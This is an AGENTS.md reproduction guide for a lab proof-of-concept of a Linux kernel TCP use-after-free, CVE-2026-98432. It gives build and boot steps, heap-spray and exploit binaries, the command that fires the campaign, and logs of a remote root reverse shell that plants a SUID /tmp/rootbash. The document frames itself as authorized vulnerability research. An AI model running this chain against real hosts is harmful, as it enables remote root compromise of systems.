# AGENTS.md — CVE-2026-98432 lab (operator / reproduction guide)

**Scope:** authorized local lab only. This package is a research PoC for
CVE-2026-98432 (Linux IPv4/TCP `ireq_opt`/`inet_opt` UAF). Do not run it against
systems you do not own or have written permission to test.

**Read this first, then `docs/CVE.md` (CVE record and references),
`docs/LAB-SETUP.md` (environment) and `docs/SETTINGS.md` (default vs. lab
settings).**

---

## 1. What this package proves (and what it does not)

On a **stock Ubuntu 24.04.4, kernel `6.8.0-106-generic`** (stock cmdline,
KASLR/SMEP/SMAP/`RANDOM_KMALLOC_CACHES`/`SLAB_FREELIST_HARDENED` all on), the
lab obtains a **remote root reverse shell** from an attacker VM, and the target
**stays alive through the campaign's 20 s checkpoint** (SUID `/tmp/rootbash`
persists). Longer survival is not guaranteed; some archived fires panic later
(see `docs/CAPABILITY.md` §Real-world realism gaps).

Fresh reproduction in this package:

```
seed 0xda78b74fa99cd1e9, bucket key, src .11, F=2 L=1
root=1  alive5=1  alive20=1  suid=1  ttr=42s
handler: CONNECTED (192.168.89.2) -> uid=0(root) -> SHELL_OK
```

Evidence: `evidence/REPRO-root-*.txt`. An independent libvirt re-run on
2026-11-18 (`seed 0x4ab38ffb48e8e4a`, bucket `key`: root=1, alive at 20 s and
~5 min, SUID) is in `evidence/REPRO-libvirt-20261118.txt`.

**End goal:** a default-settings RCE on Ubuntu 24.04 over both the MPTCP and
plain-TCP paths (e.g. `sshd`), with no target-side root setup, kprobes,
custom listeners, root ring or reboot lottery. **Current status:** the MPTCP
full chain is demonstrated only in the instrumented lab; plain TCP is not
reached; see `README.md` “Status at a glance” and `docs/CAPABILITY.md`.

**It is not a default-settings exploit.** It requires target-side enablers:

* 46 tracefs stretch probes on `ip_build_and_send_pkt` (+`rdopt2`) — root,
* MPTCP listener `:9800` + `TCP_SAVE_SYN` listener `:9801` — root,
* a root `CAP_NET_RAW` AF_PACKET ring (`lab/ringone.py`) for the controlled page,
* reclaim sprays on the target (`keyspray`/`unixspray`),
* attacker-side raw-socket storm + reverse-shell handler.

Reliability: the victim's random-kmalloc bucket matches a spray in **2/16**
boots (~8 boots/match); **given a match, 9/9 fires rooted** and stayed alive at
20 s. See `docs/CAPABILITY.md` for the measured campaign and the structural
limitations proven in `docs/HUNT1-ORDERING.md` / `docs/HUNT3-WIRE-G.md`.

---

## 2. Package contents

```
AGENTS.md            this guide
README.md            short project intro
PLAN.md              original plan / threat model
docs/                CVE, CAPABILITY, LAB-SETUP, SETTINGS, HUNT1/3,
                     PHASE1..4, BASELINE, MULTIQUEUE
exp/                 C sources (mpstorm3*, keyspray, unixspray, afspray, ...)
exp/bin/             prebuilt static x86-64 binaries
lab/                 launch/stop, campaign, boot hunts, ringone, shell_handler,
                     port_map, mq-setup/mq-teardown, ssh helpers
lab/bin/             prebuilt storm variants
target/              MPTCP keeper + TCP_SAVE_SYN listener (run on the target)
scripts/             wire-slide / leak parsing helpers
evidence/            root/fire logs, campaign CSVs, serial captures, pcaps
```

The harness is **relocatable**: scripts derive the project root from their own
path. No absolute paths remain.

---

## 3. Not included (bring your own)

| Artifact | Why | How to get it |
|---|---|---|
| `lab/harness/*.qcow2` + `seed-*.img` | VM disks are multi-GB | build from the Ubuntu 24.04 cloud image; see `docs/LAB-SETUP.md` §3 |
| `lab/kernel/vmlinuz-6.8.0-106-generic`, `initrd.img-...` | kernel packages | `apt download linux-image-6.8.0-106-generic` (Ubuntu archive) |
| `lab/ssh/id_ed25519` | private key (never publish) | `ssh-keygen -t ed25519 -f lab/ssh/id_ed25519`; authorize the `.pub` in the guest seed |
| `lab/cache/` | base cloud image | download from Ubuntu |

---

## 4. Architecture

Two VMs + the host:

| Role | SSH host-forward | vCPU/RAM | Notes |
|---|---|---|---|
| target (stock twin) | `:2101` | 4 / 4 GB | `instrumented` image booted with `NO_SLUB=1` → stock cmdline |
| attacker | `:2224` | 4 / 2 GB | raw-socket storm + reverse-shell listener |
| host | — | — | QEMU/KVM, tap/bridge, SSH orchestration, serial logs |

Lab link (4-queue tap): `br-cve` + `tap-cve-{tgt,ins,atk}`; target
`192.168.89.2/24`, attacker `192.168.89.1/24` + `.11-.30` aliases.
Management NIC is QEMU user-net. The lab dir is shared as 9p `host0` →
`/mnt/lab` in the guests. Full detail: `docs/LAB-SETUP.md`.

---

## 5. Build and boot (checklist)

```bash
# 0) host deps: qemu-system-x86_64 + KVM, qemu-img, cloud-image-utils,
#    iproute2, openssh, gcc, python3, zstd, ethtool, tcpdump;
#    ~16 GB RAM free.

# 1) kernel + initrd
mkdir -p lab/kernel
cp /path/to/vmlinuz-6.8.0-106-generic        lab/kernel/
cp /path/to/initrd.img-6.8.0-106-generic     lab/kernel/

# 2) SSH key (then put the .pub into the cloud-init seed for both guests)
ssh-keygen -t ed25519 -N '' -f lab/ssh/id_ed25519

# 3) VM images (Ubuntu 24.04 cloud image + seed with user 'ubuntu' + key)
#    -> lab/harness/{target,instrumented,attacker}.qcow2 + seed-*.img
#    see docs/LAB-SETUP.md §3; root filesystem UUID must match ROOT_UUID in
#    lab/launch.sh (or override ROOT_UUID=...).

# 4) host bridge + taps (one-time, needs sudo)
sudo bash lab/mq-setup.sh

# 5) boot attacker, then the stock twin
LAB_NET=tap bash lab/launch.sh attacker
NO_SLUB=1 EXTRA_APPEND='' NO_GDB=1 LAB_NET=tap bash lab/launch.sh instrumented
```

Sanity checks:

```bash
ssh -i lab/ssh/id_ed25519 -p 2101 ubuntu@localhost 'uname -r; cat /proc/cmdline'
ssh -i lab/ssh/id_ed25519 -p 2224 ubuntu@localhost 'uname -r; ip -br addr show ens4'
```

Target cmdline must show **no** `slub_debug`/`nokaslr`/`mitigations=off`.

---

## 6. Reproduce the RCE

```bash
# from the project root; USABLE_BUCKETS=key,unix restricts the hunt to the two
# reliable reclaim buckets
USABLE_BUCKETS=key,unix bash lab/campaign.sh 2
```

Per trial the campaign:

1. reboots the stock twin and hunts a boot whose random-kmalloc bucket equals
   `user_key_payload` or `unix_address` (`lab/find-match-any.sh`,
   `lab/any_match.py`);
2. configures the target (`ens4 up`, `192.168.89.2/24`, RPS, both listeners,
   MPTCP token on the attacker);
3. measures the free CPU `F` and reader CPU `L`, picks a source IP with `F≠L`;
4. builds the controlled page `G` (`lab/ringone.py`, root ring + pagemap +
   `/proc/kcore`);
5. starts `keyspray`/`unixspray` on `F`, arms the 46 stretch probes +
   `rdopt2`, starts `lab/shell_handler.py` on the attacker;
6. fires `lab/bin/mpstorm3_mix4`; on connect the handler kills the storm and the
   payload contains the target (`fuser -k 9800/9801`, kills the sprays);
7. records `root/alive5/alive20/suid/ttr`.

Success looks like:

```
=== trial 1 boot=5 seed=0xda78b74fa99cd1e9 match=key ===
  src=.11 F=002 L=001
  root=1 alive5=1 alive20=1 suid=1 ttr=42s
```

and in `/tmp/handler_campaign.log` on the attacker:

```
CONNECTED ('192.168.89.2', ...)
uid=0(root) gid=0(root) groups=0(root)
SHELL_OK
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

The campaign CSV is written to `/tmp/campaign.csv` (logs `/tmp/campaign.log`).
For a manual preflight and post-fire checklist inside the guests, see
`docs/LAB-SETUP.md` §6.1.
Each trial takes a few minutes; expect ~8 boots per match (2/16) and a
successful fire within a couple of trials.

---

## 7. Defaults vs. lab customizations (short version)

Stock (verified): Ubuntu 24.04.4, `6.8.0-106-generic`, stock cmdline, KASLR,
SMEP/SMAP, `unprivileged_bpf_disabled=2`, `perf_event_paranoid=4`,
`apparmor_restrict_unprivileged_userns=1`, `RANDOM_KMALLOC_CACHES=y`,
`SLAB_FREELIST_HARDENED=y`, `HARDENED_USERCOPY=y`.

Lab-added (non-default): tracefs probes, both listeners, root AF_PACKET ring,
sprays, RPS tuning, attacker IP aliases, containment. Full tables and the
per-gate mapping: **`docs/SETTINGS.md`**.

---

## 8. Known limitations / troubleshooting

* **2/16 bucket lottery.** Boots whose victim bucket matches neither spray are
  skipped/panic; the hunt reboots until a match. This is structural
  (`RANDOM_KMALLOC_CACHES`); see `docs/HUNT1-ORDERING.md`.
* **Survival is time-bounded.** The campaign only checks 5 s and 20 s. The
  fake-skb release can emit a `free_large_kmalloc` warning and some archived
  fires panic at 335–419 s; the 2026-11-18 libvirt re-run stayed alive past
  5 min. Do not read “alive20=1” as “the target can never panic”.
* **No default-settings path.** The kprobe stretch, listeners and root ring are
  required; Hunts 1 and 3 prove each is structural for this CVE.
* **saved_syn bucket** is not reliable: layout verified, but the aimed raw-SYN
  spray starves the target's free path (0/6 fires). Keep the hunt at
  `USABLE_BUCKETS=key,unix`.
* **kprobe busy**: disable events before clearing `kprobe_events`
  (`echo 0 > events/kprobes/enable`), else `Device or resource busy`.
* **AF_ALG/BPF**: `algif_aead` is disabled/not auto-loadable and unprivileged
  BPF is off on the stock image; don't rely on those paths.
* **taps**: `sudo bash lab/mq-setup.sh` once; `lab/mq-teardown.sh` to clean up.
  Socket-link mode (`LAB_NET` unset) works for single-queue runs but loses the
  cross-CPU geometry.
* **ens4 down after boot** is expected; the harness configures it per run.
* **disk**: the campaign truncates `/var/log` on the target; keep a few GB free
  in the guest.
* **no KVM** → very slow; enable `/dev/kvm`.

---

## 9. Rebuilding the binaries

```bash
make -C exp exploit     # builds the tool set into lab/bin/ and the sprays into exp/bin/
make -C exp sprays      # only keyspray, unixspray and afspray
make -C exp all         # the two storm binaries (mpstorm3, mpstorm3_mix4)
make -C exp clean
```

`lab/bin/mpstorm3_mix4` is the frozen binary used by the campaign; rebuilding
it from the current `exp/mpstorm3.c` produces a source-current binary (it may
differ byte-for-byte). Validate a rebuild with a full campaign run before
using it as a drop-in replacement.

Python tooling uses the standard library only.

---

## 10. Evidence map

| File | Meaning |
|---|---|
| `evidence/REPRO-root-*.txt` | fresh end-to-end root (handler log + campaign row) |
| `evidence/REPRO-libvirt-20261118.txt` | independent libvirt re-run: root, SUID, alive at 20 s and ~5 min |
| `evidence/ROOT-4spray-nondestructive-*.txt` | 4-spray root, target alive |
| `evidence/campaign-run2-keyunix-*.{csv,log}` | 6/6 reliable-bucket campaign |
| `evidence/campaign-run1-allbuckets-*` | key/unix 3/3 vs saved 0/4 |
| `evidence/hunt1-free-latency-*.txt` | 1–54 µs free latency (p50 8 µs) |
| `evidence/hunt3-iomapped-ubuf-*.txt` | wire-`G` rejection (optlen=4) |

---

## 11. Safety

* Authorized lab only; you are responsible for the systems you run this on.
* The exploit arms kprobes, opens listeners and kills its own sprays/listeners
  on the target; do not run it on shared or production hosts.
* Do not redistribute `lab/ssh/` private keys or VM images that contain them.
